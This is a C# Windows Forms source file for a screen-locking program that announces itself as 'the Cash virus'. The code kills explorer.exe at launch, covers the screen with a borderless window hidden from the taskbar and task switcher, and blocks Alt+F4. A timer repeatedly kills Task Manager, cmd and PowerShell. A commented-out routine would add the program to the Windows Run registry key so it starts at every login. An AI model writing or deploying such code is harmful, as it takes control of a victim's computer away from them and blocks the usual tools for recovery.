using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Cash
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            this.KeyDown += Form1_KeyDown;
            InitializeComponent();
            this.CenterToScreen();
            Process.Start("cmd.exe", "/c taskkill -f -im explorer.exe");

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            this.ShowInTaskbar = false; 
            // SetStartup(true);

            FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;

            button1.Left = (this.ClientSize.Width - button1.Width) / 2;
            button1.Top = (this.ClientSize.Height - button1.Height) / 2;
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true;
            }
                

            
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Process process in Process.GetProcessesByName("Taskmgr")) { if (process.ProcessName == "Taskmgr") { process.Kill(); } }

            foreach (Process process in Process.GetProcessesByName("cmd")) { if (process.ProcessName == "cmd") { process.Kill(); } }

            foreach (Process process in Process.GetProcessesByName("powershell")) { if (process.ProcessName == "powershell") { process.Kill(); } }

        }
        /*private void SetStartup(bool enable)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            key.SetValue("Cash", Application.ExecutablePath.ToString());
        }*/
        protected override CreateParams CreateParams
        {
            get
            {
                
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;

            }
        }



        private void button1_Click(object sender, EventArgs e)
        {

            MessageBox.Show("Your computer is infected with the Cash virus.");
        }

        
    }
}
